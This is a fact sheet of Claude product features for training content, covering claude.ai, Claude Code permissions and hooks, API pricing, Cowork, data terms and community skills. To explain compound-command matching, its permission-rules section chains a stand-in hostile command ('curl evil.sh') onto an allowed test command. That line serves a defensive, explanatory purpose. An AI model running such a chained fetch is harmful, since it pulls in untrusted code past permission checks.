# Claude fact sheet for training content

Verified against official Anthropic documentation on **2026-09-17**. Training content that names a Claude
feature must trace back to a line here. Anything not listed is left out of the trainings. Re-verify before
changing content: these products change quickly.

Simulated numbers in the app (tokens, costs, latency, quality) are teaching models, not measurements.

---

## Claude for Everyday Work (claude.ai / Claude desktop)

**Projects** — https://support.claude.com/en/articles/9517075-what-are-projects
- Available on every plan. A project has uploaded knowledge files and project instructions.
- On paid plans, when project knowledge nears the context limit, Claude switches to retrieval to expand capacity.
- Team and Enterprise can share projects with view or edit access.

**Artifacts** — https://support.claude.com/en/articles/9487310
- Artifacts are things Claude makes for you to put in front of someone (designs, decks, documents, dashboards, small tools). They open beside the chat, can be edited and shared by link. All plans.

**File creation** — https://support.claude.com/en/articles/12111783
- Claude can create .xlsx, .pptx, .docx, PDF files and PNG charts, downloadable or saved to Google Drive. 30 MB file limit.
- Enabled under Settings › Capabilities › "Code execution and file creation" (on by default for Free, Pro, Max).
- Counts against usage limits and uses more tokens than typical chats.

**Claude for PowerPoint** — https://claude.com/docs/office-agents/powerpoint
- Add-in for Pro, Max, Team, Enterprise. Reads the slide master, layouts, fonts and colours; can edit individual slides; turns bullets into native editable charts and diagrams; has an Instructions field for persistent brand rules.
- Best practices: apply your template first, be specific about which slide or element to change, review every change and check brand compliance, keep a human review before client deliverables. Beware prompt injection from untrusted files.

**Skills** — https://support.claude.com/en/articles/12512180
- Available on all plans, requires code execution. Upload a custom skill as a ZIP; private until shared; org owners can provision skills.

**Connectors** — https://support.claude.com/en/articles/11175166 · https://support.claude.com/en/articles/11176164
- Connectors reach apps like Google Drive, Slack, Linear. Custom connectors are remote MCP servers. Desktop extensions (desktop app only) reach local apps and files.

**Memory** — https://support.claude.com/en/articles/11817273
- On by default for Free, Pro, Max; off by default for Team and Enterprise until enabled. Each project has its own memory. Incognito chats are excluded. Settings › Memory to view, edit, pause, reset.

**Model picker** — https://support.claude.com/en/articles/8664678
- The menu next to send chooses model, effort level and whether thinking is on.

**Research** — https://support.claude.com/en/articles/11088861
- Paid plans. Needs web search on. Gives cited answers. Can use up limits faster.

**Usage limits** — https://support.claude.com/en/articles/9797557 · https://support.claude.com/en/articles/11647753
- A five-hour session limit plus weekly caps. Exact numbers are not published.
- Uses more: long messages, large attachments, long conversations, tools (Research, web search, code execution), file creation, model and effort choice.
- Project content is cached, so reusing it does not count against limits the way re-uploading does.
- Tips: combine questions into one message, keep reference documents in a Project, turn off tools you do not need, lower effort or thinking for routine work, check Settings › Usage.

**Not verified, excluded:** Styles (may be moving into skills), exact usage-limit numbers.

---

## Claude Code Power User

**Settings** — https://code.claude.com/docs/en/settings
- Precedence, highest first: managed settings › command line (`--settings`) › `.claude/settings.local.json` › `.claude/settings.json` › `~/.claude/settings.json`.
- Array settings such as `permissions.allow` merge across levels.
- `permissions.defaultMode` values `auto` and `bypassPermissions` are ignored in project and local settings.
- Settings files hot-reload. Keys include `permissions` (allow / ask / deny / defaultMode), `env`, `model`, `availableModels`, `fallbackModel`, `hooks`, `statusLine`, `outputStyle`, `apiKeyHelper`, `cleanupPeriodDays`.

**Permission rules** — https://code.claude.com/docs/en/permissions (verified 2026-09-17)
- Rules are `Tool` or `Tool(specifier)`, e.g. `Bash(npm run test *)`, `Read(./.env)`, `Edit(src/**)`, `WebFetch(domain:example.com)`.
- Evaluated in order deny, then ask, then allow; the first match wins and specificity does not change the order. An allow rule cannot carve an exception out of a deny rule.
- By default (manual mode): read-only tools (file reads, Grep) need no approval inside the working directory; Bash commands need approval except a built-in set of read-only commands; file modifications need approval.
- Bash: `*` matches any text; the `:*` suffix is equivalent to a trailing ` *`; a trailing ` *` also matches the bare command (`Bash(ls *)` matches `ls`).
- Compound commands are split on `&&`, `||`, `;`, `|`, `&` and newlines: an allow rule must match every subcommand, and deny/ask rules apply if any subcommand matches. So `Bash(npm test *)` does not allow `npm test && curl evil.sh`.
- Bash deny rules match the command text as written and are not a security boundary (the same program via another path or `sh -c` is not matched); pair with sandboxing when it must hold.
- Read/Edit rules use gitignore syntax: `*` within one path segment, `**` across directories, a bare filename such as `Read(.env)` matches at any depth, `//path` is absolute, `~/path` is home-relative.
- `permissions.disableBypassPermissionsMode` can be set to `"disable"`, most useful in managed settings.

**Hooks: verified details** — https://code.claude.com/docs/en/hooks (verified 2026-09-17)
- `SessionStart` and `UserPromptSubmit`: plain-text stdout (exit 0) is added as context Claude can see.
- `PreToolUse` exit 2 blocks the tool call. `PostToolUse` exit 2 is not honoured: the tool already ran.
- `Stop` exit 2 prevents Claude from stopping and continues the conversation.
- `Notification` fires when Claude Code sends a notification; its matcher filters on notification type (e.g. `permission_prompt`, `idle_prompt`).
- Tool events match on tool name (`Bash`, `Edit|Write`, `mcp__.*`); `SessionStart` matches how the session started (`startup`, `resume`, `clear`, `compact`); `UserPromptSubmit` and `Stop` have no matcher.
- Hooks can be configured in `~/.claude/settings.json`, `.claude/settings.json` (shareable), `.claude/settings.local.json`, managed settings, plugins, and skill/subagent frontmatter.

**Models** — https://code.claude.com/docs/en/model-config
- Aliases: `default`, `best`, `fable`, `opus`, `sonnet`, `haiku`, `sonnet[1m]`, `opus[1m]`, `opusplan` (Opus while planning, Sonnet while executing).
- Selection precedence: `/model` in session › `--model` › `ANTHROPIC_MODEL` › `model` setting.
- `ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU,FABLE}_MODEL` pin what aliases resolve to. `CLAUDE_CODE_SUBAGENT_MODEL` sets the subagent default.
- `/effort` levels: low, medium, high, xhigh, max. `/fast` toggles fast mode (research preview, priced higher).
- `fallbackModel` chains models used when one is overloaded or unavailable.
- There is **no official automatic task-based routing**. Routing is done by you: `opusplan`, subagent models, effort, fallback.

**CLAUDE.md** — https://code.claude.com/docs/en/memory
- Locations: managed, user `~/.claude/CLAUDE.md`, project `./CLAUDE.md` or `./.claude/CLAUDE.md`, local `./CLAUDE.local.md`. Files are concatenated, not overridden. Subdirectory files load when Claude reads files there.
- `@path` imports, nesting up to 4 hops. `.claude/rules/*.md` can be scoped with `paths:` frontmatter.
- `/init` generates a starter; `/memory` edits files. Keep each file under ~200 lines: it loads into every session.

**Hooks** — https://code.claude.com/docs/en/hooks
- Events include SessionStart, UserPromptSubmit, PreToolUse, PostToolUse, PermissionRequest, Stop, SubagentStop, PreCompact, Notification.
- Matchers: `*` or empty matches all; plain names and `|` lists match exactly; other patterns are regex. MCP tools are `mcp__<server>__<tool>`.
- Exit code 0: success. Exit code 2: blocks the action and sends stderr back to Claude. Other codes: non-blocking error.

**Skills** — https://code.claude.com/docs/en/skills
- `~/.claude/skills/<name>/SKILL.md` or `.claude/skills/<name>/SKILL.md`. Only the description loads up front; the body loads when used. `.claude/commands/*.md` still works but is legacy; both create `/name` commands.

**Subagents** — https://code.claude.com/docs/en/sub-agents
- `.claude/agents/*.md` or `~/.claude/agents/*.md` with frontmatter `name`, `description` (required), `tools`, `model`, `permissionMode`, and more. A subagent works in its own context and returns a summary.

**Output styles** — https://code.claude.com/docs/en/output-styles
- Built-in styles include Default, Explanatory and Learning. Custom styles live in `.claude/output-styles`. Chosen via `/config`.

**Status line** — https://code.claude.com/docs/en/statusline
- `statusLine` runs a command that receives session JSON (model, context usage) on stdin.

**MCP** — https://code.claude.com/docs/en/mcp
- Scopes: local (default, private to you in this project), project (`.mcp.json`, shared in the repo, requires approval), user (all your projects).

**Context** — https://code.claude.com/docs/en/context-window
- `/context` shows what fills the window. `/compact [focus]` summarizes. `/clear` starts fresh. Auto-compact runs as the window fills. The project CLAUDE.md is re-read after compaction.

**Not verified, excluded:** hook JSON output fields in detail.

---

## Building on Claude

**Prompt caching** — https://platform.claude.com/docs/en/build-with-claude/prompt-caching
- `cache_control` on up to 4 blocks (or automatic top-level). TTL 5 minutes or 1 hour.
- Relative pricing: 5-minute cache write 1.25× base input, 1-hour write 2×, cache read 0.1×.
- Each model has a minimum cacheable prompt length; shorter prefixes silently do not cache.
- The cache is a prefix: any change before a breakpoint invalidates it. Changing thinking settings invalidates it too.

**Batches** — https://platform.claude.com/docs/en/build-with-claude/batch-processing
- 50% discount. Most batches finish within an hour; they expire after 24 hours. Stacks with caching.

**Token counting** — https://platform.claude.com/docs/en/build-with-claude/token-counting
- `POST /v1/messages/count_tokens` is free and returns an estimate.

**Thinking** — https://platform.claude.com/docs/en/build-with-claude/extended-thinking
- Newer models use adaptive thinking with an effort setting instead of a fixed `budget_tokens`.

**Rate limits** — https://platform.claude.com/docs/en/api/rate-limits
- Limits on requests, input tokens and output tokens per minute. 429 responses include `retry-after`.

**Cloud providers and gateways** — https://code.claude.com/docs/en/third-party-integrations · https://code.claude.com/docs/en/llm-gateway
- Claude is available via Amazon Bedrock, Google Cloud's Agent Platform (formerly Vertex AI) and Microsoft Foundry.
- Claude Code can route through an LLM gateway with `ANTHROPIC_BASE_URL`; credentials via `ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_API_KEY` or `apiKeyHelper`. Pin model versions with `ANTHROPIC_DEFAULT_*_MODEL`.

**Managed settings** — https://code.claude.com/docs/en/settings
- Delivered by file, MDM or the admin console. Useful keys: `availableModels`, `permissions.deny`, `allowManagedPermissionRulesOnly`. Managed settings cannot be overridden by users.

**Monitoring** — https://code.claude.com/docs/en/monitoring-usage
- OpenTelemetry via `CLAUDE_CODE_ENABLE_TELEMETRY=1` and OTLP exporter settings. Metrics include token usage, cost usage and session count. Prompt text is only logged when explicitly enabled.

**Headless and CI** — https://code.claude.com/docs/en/headless · https://code.claude.com/docs/en/github-actions
- `claude -p` runs non-interactively with `--output-format json`, `--allowedTools`, `--permission-mode`. `--bare` skips hooks, CLAUDE.md and MCP loading, recommended for CI.
- GitHub Actions: `anthropics/claude-code-action@v1`.
- The Agent SDK (Python, TypeScript) is the programmatic way to build agents on the same harness.

**Evals** — https://platform.claude.com/docs/en/test-and-evaluate/develop-tests
- Define specific, measurable success criteria. Mirror real traffic including edge cases. Prefer many automatically graded cases. Grading preference: code-based, then LLM-based (validated), then human.

**Not verified, excluded:** LiteLLM specifics, Bedrock/Vertex env var names. (Agent SDK package names are now verified in the Workshop section.)

---

## Making Things with Claude (decks, designs, reports)

Verified **2026-09-18**. These surfaces are moving quickly — re-check before editing this content.

**Claude Design: what it is and where it runs** — https://support.claude.com/en/articles/14604416-get-started-with-claude-design
- Create designs, interactive prototypes, one-pagers and other visual work by having a conversation with Claude.
- Available in beta on Pro, Max, Team and Enterprise. Not available on Free.
- On by default on Pro, Max and Team. **Off by default on Enterprise until an owner turns it on in Organization settings › Artifacts.** Pro and Max can turn it off in Settings › Capabilities.
- Reachable in a normal conversation, in the Artifacts tab, in Claude Code, in the iOS and Android apps, and standalone at claude.ai/design (which has its own separate setting).
- Imports: screenshots and images, existing design files, raw uploads, a codebase (GitHub repo or `/design-sync`). Announcement adds DOCX, PPTX and XLSX.
- Exports: .zip, PDF, PPTX, standalone HTML; hand off to Claude Code; integrations including Canva and Figma.
- Design systems: a project inherits the organisation's design system, so brand colours, fonts and components are already in place without uploading anything. Claude checks its own output against the design system and corrects before you see it. "Design system import is only as good as its source."
- Editing: inline comments on specific elements, direct text editing, on-canvas drag/resize/align, chat-based refinement.

**Claude Design: usage** — https://support.claude.com/en/articles/14604416-get-started-with-claude-design
- "Claude Design counts toward the same usage limits as the rest of Claude. Design activity draws from the same pool as the rest of your work with Claude, including Claude Code, so there's no separate Claude Design allowance to track."
- "Claude Design previously had its own weekly allowance, separate from your other usage limits. All Claude Design activity now counts toward your plan's shared limits."
- "Complex projects with large codebases or many iterations consume more usage."
- If you reach your usage limits, Claude Design is unavailable until they reset. Usage credits let you keep working past the included limits.

**Claude Design for slide decks** — https://academy.claude.com/tutorials/using-claude-design-for-presentations-and-slide-decks
- Presentations are generated as interactive HTML rendered in the canvas. Export as HTML (keeps interactivity and animations), PPTX, PDF, .zip, send to Canva, or hand off to Claude Code.
- If the organisation has a design system, slides pick up its colours, typography and visual style automatically.
- Ask for changes by naming the slide ("On slide 3, change…"). You can request new slides, expand sections, describe data to get a visualisation, and include images and logos.
- Sharing: private by default; organisation link access with view, comment or edit permissions.

**Claude for PowerPoint** — https://claude.com/docs/office-agents/powerpoint
- **Generally available** to Pro, Max, Team and Enterprise — unlike Claude Design, which is in beta.
- An add-in that runs inside PowerPoint, not in claude.ai. PowerPoint on the web; on Windows with Microsoft 365, build 16.0.13127.20296 or later; on Mac 16.46 or later. Installed from Microsoft AppSource or deployed by an admin.
- Builds slides from existing corporate templates, makes pinpoint edits to a single slide without regenerating the deck, generates deck structures from natural language, and converts bullets into diagrams and **native, editable PowerPoint charts — not static images**.
- Reads the slide master, layouts, fonts and colour scheme and uses them when generating or editing.
- Instructions set in PowerPoint apply only to PowerPoint; they are separate from Excel and Word. Context is shared with Claude for Excel, Word and Outlook.
- Long conversations are automatically compacted into new conversations to avoid running out of context.
- Same usage limits as the rest of your Claude account.
- Not recommended for: "Final client deliverables without human review"; presentations with highly sensitive or regulated data without proper controls; "Replacing your judgment on design and narrative flow."
- "Only use Claude for PowerPoint with trusted files. Files from external sources can contain hidden instructions that manipulate the add-in into extracting data, modifying records, or performing destructive actions."

**File creation** — https://support.claude.com/en/articles/12111783
- Creates .xlsx, .pptx, .docx and PDF. Available to Free, Pro, Max, Team and Enterprise on web, Claude Desktop and mobile; on by default for all of them.
- "Use of this capability draws from the same usage limits offered by your plan. Note that creating files will use more of your limit compared to normal chats with Claude."
- Maximum 30 MB per file, for both uploads and downloads.

**Usage limits** — https://support.claude.com/en/articles/11647753-understanding-usage-and-length-limits
- Usage is affected by conversation length and complexity, which features you use, which model, and the effort level. Higher effort uses more tokens.
- "Longer conversations that trigger automatic context management consume more of your usage limit."
- "Tools and connectors are token-intensive, so managing them helps both maximize your available context window and optimize your usage limits."
- "Note that your usage of all different Claude product surfaces (claude.ai, Claude Code, Claude Desktop) counts towards the same usage limit."
- Advice on the page: start a new conversation when a long chat nears the limit, use projects, reduce effort level, disable unused tools.

**Not verified, excluded:** any separate Claude Design allowance (explicitly retired — see above); any published number, ratio or benchmark for how much usage Claude Design consumes; a single status word for Claude Design (the support article says "beta", the announcement says "research preview" from "Anthropic Labs", and claude.com/product/design says only that it is included in paid plans — so plan behaviour is cited from the support article and the Labs framing from the announcement, and no one word is stated as fact); an official head-to-head comparison of Claude Design and Claude for PowerPoint.

**Re-verify:** the "five-hour session limit plus weekly caps" line in the Everyday Work section above cites https://support.claude.com/en/articles/9797557, which was not re-checked on 2026-09-18. The newer limits article does not state reset windows.

---

## Claude Onboarding Workshop (verified 2026-10-05)

Verified **2026-10-05** against official Anthropic pages only (anthropic.com, claude.com, support/privacy.claude.com,
code.claude.com, academy.claude.com). These surfaces change weekly; Cowork in particular changes again on
2026-10-06 (see below). Re-verify before editing content.

Already covered above and reused here (do not duplicate): Projects, Artifacts, File creation, Connectors and
desktop extensions, Memory, Research, Model picker, Usage limits (§ Everyday Work); Claude Code Skills,
Subagents, Settings/permissions (§ Claude Code Power User); "Agent SDK ... same harness" (§ Building on Claude).

### Skills on claude.ai / Desktop

**Skills (support)** — https://support.claude.com/en/articles/12512180
- "Skills extend Claude's capabilities by giving it access to specialized knowledge and workflows."
- Anthropic-provided skills: Excel spreadsheet creation and manipulation, Word document creation, PowerPoint
  generation, PDF creation and processing.
- Custom skills: package as a ZIP and upload under Customize › Skills (private until shared — see existing line).
- Org-provisioned: "Owners of Team and Enterprise organizations can provision skills for all users." They show with a
  team indicator in the user's skills list.
- Plans: "Skills are available for users on Free, Pro, Max, Team, and Enterprise plans." Requires code execution
  to be enabled.
- Loading: "Claude will automatically use these tools when relevant. You don't need to explicitly invoke them —
  Claude determines when each skill is needed based on your request."

**Skills (announcement, 2025-10-16)** — https://claude.com/blog/skills (anthropic.com/news/skills redirects here)
- "Skills are folders that include instructions, scripts, and resources that Claude can load when needed."
- "Claude will only access a skill when it's relevant to the task at hand."
- Skills work across Claude apps, the Claude Developer Platform (API) and Claude Code.
- NOTE: the 2025 announcement listed Pro, Max, Team, Enterprise; the current support article adds Free. Cite the
  support article for plans.

**Skills in Claude Code: progressive disclosure** — https://code.claude.com/docs/en/skills
- The `description` is always in context; the full body loads only when the skill is invoked, by Claude
  automatically or by the user with `/skill-name`. "a skill's body loads only when it's used, so long reference
  material costs almost nothing until you need it."
- `disable-model-invocation: true` makes a skill manual-only. Plugins can bundle skills under `skills/`.
- Claude Code implements the open Agent Skills specification (https://agentskills.io).

**Plugins in Claude apps** — https://support.claude.com/en/articles/13837440-use-plugins-in-claude
- All paid plans (Pro, Max, Team, Enterprise). Customize › Plugins › Discover › Add.
- Usable in web chat, the Desktop Chat tab and Cowork; plugins added to the account are also available in
  Claude Code when signed in with the same account. Type "/" or "+" to see plugin skills.
- Org management: https://support.claude.com/en/articles/13837433-manage-plugins-for-your-organization (not read in detail).

### Claude Desktop / claude.ai features

Projects, artifacts, file creation, connectors, desktop extensions, memory, Research: see existing lines above.

**Incognito chats** — https://support.claude.com/en/articles/12260368-use-incognito-chats
- "temporary conversations that aren't saved to your chat history or to Claude's memory." All plans (Free, Pro,
  Max, Team, Enterprise). Start via the ghost icon on a new chat outside a project.
- "Incognito chats are not used for training." They don't use existing memory and aren't added to it.
- Team/Enterprise: retained 30 days for safety (or longer per org retention policy) and included in org data
  exports available to Owners.

**Claude Cowork** — https://support.claude.com/en/articles/13345190-get-started-with-claude-cowork
- "Claude Cowork uses the same agentic architecture that powers Claude Code, with no terminal required."
- Paid plans only: Pro, Max, Team, Enterprise.
- Surfaces: Desktop (macOS, Windows), web, iOS/Android, Chrome side panel. Local file access, browser use and
  computer use need the Desktop app open and connected.
- Capabilities listed: multi-step tasks, local file access (desktop), browser actions, sub-agent coordination,
  scheduled tasks, connectors, spreadsheet/presentation generation. Cloud sessions are labelled beta.

**Cowork and chat merged** — https://support.claude.com/en/articles/16761823-claude-cowork-and-chat-are-one-claude
- "these are merged into a single conversation, so you don't need to decide which option better suits your task".
  "everything Claude Cowork does is available from any conversation."
- Rolling out in stages, starting with Pro and Max on web, desktop and mobile; "even accounts on the same plan will
  see the changes at different times." Enterprise gets at least 30 days' notice. Existing Cowork tasks, projects,
  connectors and files carry over.
- Teach both names: some learners will still see a separate Cowork tab.

**Cowork on Team/Enterprise** — https://support.claude.com/en/articles/13455879-use-claude-cowork-on-team-and-enterprise-plans
- "Claude Cowork is on by default, but organization owners can manually disable it" (Organization settings › Cowork).
- Cloud sessions toggle: on by default for Team, off by default for Enterprise.
- Local session data "is not subject to Anthropic's standard data retention policies, and admins cannot centrally
  manage or delete it." OpenTelemetry event streaming "doesn't replace audit logging for compliance purposes."

**Scheduled tasks** — https://support.claude.com/en/articles/13854387-schedule-recurring-tasks-in-claude-cowork
- All paid plans. Frequencies: hourly, daily, weekly, on weekdays, or manually. Each task has a name, prompt,
  approval mode and frequency.
- "Scheduled tasks run remotely, so they run on their cadence even when your computer is asleep or the Claude
  Desktop app is closed." They use connectors and files saved to the Claude account and "can't be tied to a folder
  on your computer."
- "On October 6, 2026, new Cowork tasks run in the cloud and the Only on your computer option in Settings › General
  will be removed." (Pro/Max)

**Use Cowork safely** — https://support.claude.com/en/articles/13364135-use-claude-cowork-safely
- Be selective about which local files Claude can access: it can read, write and permanently delete them.
- Permanent deletion always needs an explicit "Allow".
- Prompt injection: malicious instructions hidden in websites, emails or documents. "Only give Claude internet
  access to sites you trust." Use verified extensions from the Claude Desktop directory.
- Don't schedule tasks that access sensitive files, send messages on your behalf, make purchases, or take other
  hard-to-undo actions.

**Claude in Chrome** — https://claude.com/blog/claude-in-chrome-generally-available · admin: https://support.claude.com/en/articles/13065128-claude-in-chrome-admin-controls
- Generally available on every paid plan (announced 2026-08-26). Views the current page and can read, type, click,
  navigate and fill forms.
- Can auto-approve actions it judges safe; safeguards include probes that screen web content and a classifier that
  checks actions against the original request. "prompt injection remains a moving target."
- Not on other Chromium browsers or mobile yet. Team/Enterprise owners have admin controls.

### Data terms: consumer vs commercial

**Consumer (Free, Pro, Max)** — https://www.anthropic.com/news/updates-to-our-consumer-terms · https://privacy.claude.com/en/articles/10023580-is-my-data-used-for-model-training · https://privacy.claude.com/en/articles/12109829-how-do-i-change-my-model-improvement-privacy-settings
- Since the 2025 Consumer Terms update, Free, Pro and Max users choose whether their chats and coding sessions
  (including Claude Code on those accounts) are used to train models. Users had to choose by 2025-10-08.
- Setting: Settings › Privacy › "Help improve our AI models" toggle (claude.ai/settings/data-privacy-controls).
- Turning it off is not retroactive: data stays in training runs already started and models already trained.
- Safety-flagged conversations may be used for trust & safety work regardless. Thumbs up/down feedback is stored
  up to 5 years.
- Incognito chats are never used for training.

**Consumer retention** — https://privacy.claude.com/en/articles/10023548-how-long-do-you-store-my-data · https://code.claude.com/docs/en/data-usage
- Training on: de-identified data kept up to 5 years. Training off: 30-day retention.
- Deleted conversations leave history immediately and back-end storage within 30 days.
- Usage-policy violations: inputs/outputs up to 2 years, classifier scores up to 7 years.

**Commercial (Team, Enterprise, API, Gov, Education, Bedrock/Vertex)** — https://privacy.claude.com/en/articles/7996868-is-my-data-used-for-model-training · https://code.claude.com/docs/en/data-usage
- "By default, we will not use your inputs or outputs from our commercial products (e.g. Claude for Work,
  Anthropic API, Claude Gov, etc.) to train our models." Exceptions: explicit feedback/bug reports, or opting in
  (e.g. the Development Partner Program, which an org admin opts into; first-party API only).
- The consumer-terms change "do[es] not apply to services under our Commercial Terms".
- Claude Code data on commercial plans: standard 30-day retention; Zero Data Retention only for qualified
  Enterprise accounts, enabled per org.

**Enterprise admin retention** — https://support.claude.com/en/articles/10440198-configure-custom-data-retention-controls-for-enterprise-plans
- Enterprise only. Primary Owner/Owner sets it under Organization settings › Data and Privacy.
- "By default, data is retained indefinitely unless a custom retention period is set." Minimum 30 days. Changes
  are in audit logs.

### Agent harness, Agent SDK, Claude Code concepts

**Agent SDK** — https://code.claude.com/docs/en/agent-sdk/overview · https://code.claude.com/docs/en/agent-sdk/agent-loop
- "Build production AI agents with Claude Code as a library." Gives "the same tools, agent loop, and context
  management that power Claude Code, programmable in Python and TypeScript."
- An agent is "an application that completes a task by planning its own steps and calling tools".
- Loop: Claude receives the prompt → evaluates and responds with text and/or tool calls → the SDK runs tools and
  feeds results back → repeat until a response has no tool calls → result with text, usage, cost, session ID.
- Built-in tools: Read/Edit/Write, Glob/Grep, Bash, WebSearch/WebFetch, Agent (subagents), Skill, AskUserQuestion.
  Also hooks, MCP, permissions, sessions (resume/fork), skills/CLAUDE.md, plugins.
- Context: does not reset between turns; everything accumulates; automatic compaction summarizes older history near
  the limit; skill descriptions load at start, full content only when invoked.
- Permission modes in the SDK: `default`, `acceptEdits`, `plan`, `dontAsk`, `auto`, `bypassPermissions`.
  Limits: `maxTurns`, `maxBudgetUsd`.
- Package names now verified: `claude_agent_sdk` (Python), `@anthropic-ai/claude-agent-sdk` (TypeScript).
  (This resolves the "Agent SDK package names" exclusion in § Building on Claude.)
- Third-party products may not offer claude.ai login or rate limits unless approved; use API keys. Governed by the
  Commercial Terms.
- Related, not the same thing: Managed Agents = Anthropic-hosted harness via the Claude API.

**Subagents** — https://code.claude.com/docs/en/sub-agents
- "Each subagent runs in its own context window with a custom system prompt, specific tool access, and independent
  permissions." Uses: preserve context, enforce tool constraints, specialize, route to cheaper models.
- Built-ins: Explore (fast, read-only search), Plan (research during plan mode), general-purpose.
- Only the subagent's final response returns to the parent (agent-loop page).

**Plan mode** — https://code.claude.com/docs/en/permission-modes
- "Plan mode tells Claude to research and propose changes without making them." It reads files and runs shell
  commands to explore, but edits stay blocked until you approve the plan.
- Enter with Shift+Tab (cycles modes) or prefix a prompt with `/plan`; `--permission-mode plan` from the CLI;
  `defaultMode: "plan"` in `.claude/settings.json`. Approving a plan exits plan mode.

**Building effective agents** — https://www.anthropic.com/engineering/building-effective-agents
- Workflows: "systems where LLMs and tools are orchestrated through predefined code paths."
- Agents: "systems where LLMs dynamically direct their own processes and tool usage, maintaining control over how
  they accomplish tasks."
- "Find the simplest solution possible, and only increasing complexity when needed." Agents fit open-ended problems
  where the number of steps can't be predicted, at "higher costs, and the potential for compounding errors".
- Workflow patterns: prompt chaining, routing, parallelization, orchestrator-workers, evaluator-optimizer.

### Community skills (not Anthropic)

Not Anthropic products. Claims about savings or quality are the authors' own, not verified by us or by Anthropic.
Teach these as "examples of what the community builds", with install commands from each repo README (checked
2026-10-05).

- **Superpowers** — https://github.com/obra/superpowers — Jesse Vincent (obra) / Prime Radiant, MIT.
  "An agentic skills framework & software development methodology": composable skills for brainstorming,
  writing-plans, test-driven-development, subagent-driven-development, systematic-debugging, git worktrees, code
  review. Install in Claude Code: `/plugin install superpowers@claude-plugins-official` (README says it is in the
  official Claude plugin marketplace), or `/plugin marketplace add obra/superpowers-marketplace` then
  `/plugin install superpowers@superpowers-marketplace`.
- **Caveman** — https://github.com/JuliusBrussee/caveman — Julius Brussee, Apache-2.0. Skill (+ optional proxy) that
  makes the agent answer in terse, stripped-down "caveman" sentences. Code, paths, numbers and negations stay
  exact; it switches back to full sentences for security warnings and irreversible actions. Levels `/caveman`,
  `/ultracave`, `/megacave`; "stop caveman" to exit. Install: `npx skills add JuliusBrussee/caveman -g`, or
  `claude plugin marketplace add JuliusBrussee/caveman && claude plugin install caveman@caveman`. The README
  claims 33.2% fewer input tokens via its proxy; treat that as the author's claim.
- **Ponytail** — https://github.com/DietrichGebert/ponytail — Dietrich Gebert, MIT. "Makes your AI agent think like
  the laziest senior dev in the room": YAGNI first, then stdlib, native platform features, existing dependencies,
  one line before fifty. Levels lite / full (default) / ultra. Install: `/plugin marketplace add DietrichGebert/ponytail`
  then `/plugin install ponytail@ponytail`, or `npx skills add dietrichgebert/ponytail`. The README claims 54% less code and 20% lower cost (author's claim).
- **Spec Kit (spec-driven development)** — https://github.com/github/spec-kit — GitHub, MIT. "Toolkit to help you get
  started with SDD": write a spec, then plan, then tasks, then implement. Install the CLI with `uv tool install specify-cli`,
  then run `specify init <project> --integration <agent>` (Claude Code is supported). Workflow skills:
  `/speckit-constitution` → `/speckit-specify` → `/speckit-plan` → `/speckit-tasks` → `/speckit-implement` →
  `/speckit-converge`. NOTE: older tutorials show dotted `/speckit.specify`; the current README uses hyphens.
- Alternatives (one line each, not deeply checked):
  - **OpenSpec**: https://github.com/Fission-AI/OpenSpec. Fission AI, MIT. "Spec-driven development (SDD) for AI coding
    assistants." Install with `npm install -g @fission-ai/openspec@latest`; commands are `/opsx:explore`,
    `/opsx:propose`, `/opsx:apply` and `/opsx:archive`.
  - **BMAD Method**: https://github.com/bmad-code-org/BMAD-METHOD. "Breakthrough Method for Agile AI Driven
    Development". Analyst, PM, architect and dev agent roles carry an idea to delivery. Install with
    `npx skills add bmad-code-org/BMAD-METHOD`. The license is not stated in the GitHub metadata.
  - **Kiro**: https://kiro.dev. An AWS agentic IDE/platform that turns prompts into specs (requirements → design →
    tasks) and runs the tasks with agents. It is a separate product, not a Claude skill.

### Workflow gallery: non-technical uses

Sources are Anthropic's official use-case pages on academy.claude.com. claude.com/resources/use-cases/* now redirects there.
These are Anthropic's examples, not independent case studies. "Verified" means the underlying feature has an official
support/docs line in this file. Connectors named in the examples (Salesforce, Gong, Apollo, Daloopa, S&P Global,
Intercom, Canva, HubSpot, Notion, M365) are taken from the use-case pages; their availability per plan was not checked.

| # | Name | Who | Steps | Features (✓ = verified in this fact sheet) | Source |
|---|---|---|---|---|---|
| 1 | Prep for your week | Managers, knowledge workers | 1 Connect Microsoft 365. 2 Name the week and the sources. 3 Claude flags meetings that need prep, conflicts and focus blocks. 4 Draft replies and prep notes. 5 Save the workflow as a skill. | Connectors ✓, Skills ✓ | https://academy.claude.com/use-cases/quickly-prep-for-your-week |
| 2 | Daily briefing across tools | Ops managers, team leads | 1 Connect Slack, Notion and dashboards. 2 Specify the briefing sections (urgent, mentions, due). 3 Claude queries the sources in parallel. 4 Review by priority and dig in. 5 Run it on a schedule. | Connectors ✓, Claude in Chrome ✓, Scheduled tasks ✓, Cowork ✓ | https://academy.claude.com/use-cases/build-a-daily-briefing-across-your-tools |
| 3 | Client call prep sheet | Sales / client-facing consultants | 1 Connect CRM, call transcripts and Drive. 2 Put the account docs in a working folder. 3 Ask for a one-page prep sheet (status, asks, objections). 4 Review before the call. 5 Schedule it for every external meeting. | Connectors ✓, Plugins ✓, Scheduled tasks ✓, Cowork ✓ | https://academy.claude.com/use-cases/call-prep-sheet |
| 4 | Account research brief | Sales, business development | 1 Gather call notes, filings and internal docs in a folder. 2 Connect CRM and Drive. 3 Run the research prompt, choosing sections and a time window. 4 Review the one-page brief that mixes internal history with public signals. 5 Schedule reruns. | Connectors ✓, Skills ✓, Scheduled tasks ✓, Cowork ✓ | https://academy.claude.com/use-cases/account-research-brief |
| 5 | Compare competing proposals | Procurement, finance, ops | 1 Upload vendor proposals (PDF/docs). 2 Set the criteria (price, terms, support). 3 Claude normalizes the data across proposals. 4 Review a colour-coded comparison spreadsheet with red flags. 5 Follow up with a cost projection or decision memo. | File upload, File creation (.xlsx) ✓ | https://academy.claude.com/use-cases/compare-and-analyze-competing-options |
| 6 | Size a market | Strategists, analysts, consultants | 1 Describe the sizing question and the outputs you want. 2 Add your own research and templates. 3 Approve Claude's research plan. 4 Receive a PPTX, an XLSX and a sourced write-up. 5 Drill into segments or sensitivities. | Web research ✓ (Research), File creation ✓, Cowork ✓ | https://academy.claude.com/use-cases/size-a-market-using-your-research |
